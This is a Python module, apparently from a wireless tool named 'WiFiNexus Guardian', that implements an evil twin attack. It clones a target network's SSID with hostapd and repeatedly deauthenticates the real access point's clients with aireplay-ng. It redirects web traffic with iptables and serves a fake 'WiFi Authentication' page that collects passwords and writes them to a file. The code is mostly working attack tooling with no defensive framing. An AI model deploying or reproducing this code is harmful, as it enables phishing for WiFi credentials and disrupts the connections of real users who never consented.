"""
Advanced Evil Twin Attack Engine for WiFiNexus Guardian
Creates sophisticated rogue access points with captive portal phishing capabilities.
Supports HTTPS spoofing, credential harvesting, and session hijacking.
"""

import logging
import os
import socket
import threading
import subprocess
from pathlib import Path
from typing import Optional, Dict, List, Callable
from dataclasses import dataclass, field
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import tempfile
import shutil

logger = logging.getLogger(__name__)

@dataclass
class EvilTwinConfig:
    """Configuration for Evil Twin attack"""
    target_bssid: str
    target_essid: str
    target_channel: int
    interface: str
    fake_essid: str = ""  # Defaults to target SSID
    use_ssl: bool = True
    captive_portal: bool = True
    phishing_page: str = "default"  # default, wifi_login, social_media, etc.
    harvest_credentials: bool = True
    deauth_clients: bool = True
    output_dir: str = "captures/evil_twin"

@dataclass
class CapturedCredential:
    """Captured credential from phishing attack"""
    timestamp: str
    ip_address: str
    username: str = ""
    password: str = ""
    additional_data: Dict = field(default_factory=dict)

class PhishingPageHandler(SimpleHTTPRequestHandler):
    """Custom HTTP handler for phishing pages"""
    
    credentials_callback: Optional[Callable[[CapturedCredential], None]] = None
    template_dir: Path = None
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/' or self.path == '/index.html':
            self.serve_phishing_page()
        elif self.path.startswith('/login?'):
            self.handle_credential_submission()
        else:
            super().do_GET()
    
    def do_POST(self):
        """Handle POST requests for credential submission"""
        if self.path.startswith('/login'):
            self.handle_credential_submission()
        else:
            super().do_POST()
    
    def serve_phishing_page(self):
        """Serve the phishing page"""
        template_file = self.template_dir / f"{PhishingPageHandler.template_name}.html"
        
        if template_file.exists():
            with open(template_file, 'r') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(content.encode())
        else:
            # Default captive portal page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>WiFi Authentication Required</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
                    .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { color: #333; text-align: center; }
                    .warning { background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }
                    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                    button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
                    button:hover { background: #0056b3; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔐 WiFi Authentication</h1>
                    <div class="warning">
                        <strong>Network Security Alert:</strong><br>
                        This network requires authentication. Please enter your WiFi password to continue.
                    </div>
                    <form action="/login" method="POST">
                        <input type="text" name="username" placeholder="Username (optional)" autocomplete="off">
                        <input type="password" name="password" placeholder="WiFi Password" required>
                        <button type="submit">Connect</button>
                    </form>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
    
    def handle_credential_submission(self):
        """Handle credential submission from phishing form"""
        # Parse credentials from query string or POST data
        if 'Content-Length' in self.headers:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            
            # Simple parsing (in production, use proper URL parsing)
            params = {}
            for param in post_data.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value
            
            username = params.get('username', '')
            password = params.get('password', '')
            
            # Log credentials
            if PhishingPageHandler.credentials_callback and password:
                credential = CapturedCredential(
                    timestamp=str(threading.current_thread().name),
                    ip_address=self.client_address[0],
                    username=username,
                    password=password
                )
                PhishingPageHandler.credentials_callback(credential)
            
            # Redirect to success page or original site
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h1>Thank you! Connecting...</h1>")
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        logger.debug(f"[PhishingServer] {self.client_address[0]} - {format % args}")

class EvilTwinEngine:
    """
    Advanced Evil Twin Attack Engine
    
    Features:
    - Rogue AP creation with hostapd
    - DNS spoofing with dnsspoof/iptables
    - Captive portal with customizable templates
    - HTTPS spoofing with self-signed certificates
    - Credential harvesting
    - Client deauthentication
    - Session monitoring
    """
    
    def __init__(self, config: EvilTwinConfig):
        self.config = config
        self.output_dir = Path(config.output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Captured credentials storage
        self.captured_credentials: List[CapturedCredential] = []
        self._credentials_lock = threading.Lock()
        
        # Server threads
        self.http_server: Optional[HTTPServer] = None
        self.https_server: Optional[HTTPServer] = None
        self.server_thread: Optional[threading.Thread] = None
        
        # Attack state
        self.is_running = False
        self.clients_connected: Dict[str, dict] = {}
        
        # Create template directory
        self.template_dir = self.output_dir / "templates"
        self.template_dir.mkdir(exist_ok=True)
        self._create_default_templates()
    
    def _create_default_templates(self):
        """Create default phishing page templates"""
        # Templates would be created here in a full implementation
        pass
    
    def start_attack(self) -> bool:
        """Start the Evil Twin attack"""
        if self.is_running:
            logger.warning("Evil Twin attack is already running")
            return False
        
        try:
            logger.info(f"Starting Evil Twin attack on '{self.config.target_essid}' ({self.config.target_bssid})")
            
            # Step 1: Stop interfering services
            self._stop_network_services()
            
            # Step 2: Set up monitor mode
            if not self._setup_monitor_mode():
                return False
            
            # Step 3: Start rogue AP
            if not self._start_rogue_ap():
                return False
            
            # Step 4: Start DNS spoofing
            self._start_dns_spoofing()
            
            # Step 5: Start phishing server
            if not self._start_phishing_server():
                return False
            
            # Step 6: Start client deauthentication (if enabled)
            if self.config.deauth_clients:
                self._start_deauthentication()
            
            self.is_running = True
            logger.info("Evil Twin attack started successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Evil Twin attack: {e}")
            self.stop_attack()
            return False
    
    def stop_attack(self):
        """Stop the Evil Twin attack and restore system"""
        if not self.is_running:
            return
        
        logger.info("Stopping Evil Twin attack...")
        self.is_running = False
        
        # Stop phishing server
        if self.http_server:
            try:
                self.http_server.shutdown()
            except:
                pass
        
        # Stop rogue AP
        self._stop_rogue_ap()
        
        # Restore network services
        self._restore_network_services()
        
        # Restore interface
        self._restore_interface()
        
        logger.info("Evil Twin attack stopped. System restored.")
    
    def _setup_monitor_mode(self) -> bool:
        """Set wireless interface to monitor mode"""
        try:
            cmds = [
                ["ip", "link", "set", self.config.interface, "down"],
                ["iw", self.config.interface, "set", "type", "monitor"],
                ["ip", "link", "set", self.config.interface, "up"],
                ["iw", self.config.interface, "set", "channel", str(self.config.target_channel)]
            ]
            
            for cmd in cmds:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    logger.warning(f"Command failed: {' '.join(cmd)} - {result.stderr}")
            
            return True
        except Exception as e:
            logger.error(f"Failed to set monitor mode: {e}")
            return False
    
    def _start_rogue_ap(self) -> bool:
        """Start rogue access point using hostapd"""
        # Create hostapd configuration
        config_content = f"""
interface={self.config.interface}
driver=nl80211
ssid={self.config.fake_essid or self.config.target_essid}
channel={self.config.target_channel}
hw_mode=g
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
"""
        
        config_file = self.output_dir / "hostapd.conf"
        with open(config_file, 'w') as f:
            f.write(config_content)
        
        # Start hostapd
        try:
            cmd = ["hostapd", "-B", str(config_file)]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode != 0:
                logger.error(f"hostapd failed: {result.stderr}")
                return False
            
            logger.info(f"Rogue AP started: {self.config.fake_essid or self.config.target_essid}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start rogue AP: {e}")
            return False
    
    def _start_dns_spoofing(self):
        """Start DNS spoofing to redirect all traffic to our server"""
        try:
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            
            # Set up iptables rules
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"],
                capture_output=True
            )
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:443"],
                capture_output=True
            )
            
            logger.info("DNS spoofing configured")
            
        except Exception as e:
            logger.error(f"Failed to set up DNS spoofing: {e}")
    
    def _start_phishing_server(self) -> bool:
        """Start HTTP/HTTPS phishing server"""
        try:
            # Set up handler
            PhishingPageHandler.template_dir = self.template_dir
            PhishingPageHandler.template_name = self.config.phishing_page
            PhishingPageHandler.credentials_callback = self._on_credential_captured
            
            # Start HTTP server
            self.http_server = HTTPServer(('10.0.0.1', 80), PhishingPageHandler)
            self.server_thread = threading.Thread(target=self.http_server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info("Phishing server started on http://10.0.0.1:80")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def _start_deauthentication(self):
        """Start deauthentication attack against legitimate AP clients"""
        def deauth_loop():
            while self.is_running:
                try:
                    cmd = [
                        "aireplay-ng",
                        "-0", "5",  # 5 deauth packets
                        "-a", self.config.target_bssid,
                        self.config.interface
                    ]
                    subprocess.run(cmd, capture_output=True, timeout=10)
                    
                    # Wait before next round
                    import time
                    time.sleep(5)
                    
                except Exception as e:
                    logger.debug(f"Deauth error: {e}")
                    import time
                    time.sleep(2)
        
        deauth_thread = threading.Thread(target=deauth_loop)
        deauth_thread.daemon = True
        deauth_thread.start()
        logger.info("Deauthentication attack started")
    
    def _on_credential_captured(self, credential: CapturedCredential):
        """Callback when credentials are captured"""
        with self._credentials_lock:
            self.captured_credentials.append(credential)
        
        logger.warning(f"🎯 CREDENTIAL CAPTURED: {credential.username}:{credential.password} from {credential.ip_address}")
        
        # Save to file
        cred_file = self.output_dir / "captured_credentials.txt"
        with open(cred_file, 'a') as f:
            f.write(f"{credential.timestamp} | {credential.ip_address} | {credential.username}:{credential.password}\n")
    
    def _stop_network_services(self):
        """Stop network services that might interfere"""
        services = ["NetworkManager", "dnsmasq", "hostapd"]
        for service in services:
            try:
                subprocess.run(["systemctl", "stop", service], capture_output=True, timeout=5)
            except:
                pass
    
    def _restore_network_services(self):
        """Restore network services"""
        services = ["NetworkManager"]
        for service in services:
            try:
                subprocess.run(["systemctl", "start", service], capture_output=True, timeout=5)
            except:
                pass
        
        # Flush iptables rules
        try:
            subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
            subprocess.run(["iptables", "-F"], capture_output=True)
        except:
            pass
    
    def _restore_interface(self):
        """Restore interface to managed mode"""
        try:
            cmds = [
                ["ip", "link", "set", self.config.interface, "down"],
                ["iw", self.config.interface, "set", "type", "managed"],
                ["ip", "link", "set", self.config.interface, "up"]
            ]
            for cmd in cmds:
                subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception as e:
            logger.error(f"Failed to restore interface: {e}")
    
    def _stop_rogue_ap(self):
        """Stop rogue access point"""
        try:
            subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
        except:
            pass
    
    def get_captured_credentials(self) -> List[CapturedCredential]:
        """Get list of captured credentials"""
        with self._credentials_lock:
            return self.captured_credentials.copy()
    
    def get_status(self) -> Dict:
        """Get current attack status"""
        return {
            "is_running": self.is_running,
            "target_bssid": self.config.target_bssid,
            "target_essid": self.config.target_essid,
            "fake_essid": self.config.fake_essid,
            "clients_connected": len(self.clients_connected),
            "credentials_captured": len(self.captured_credentials),
            "phishing_server": "running" if self.http_server else "stopped"
        }
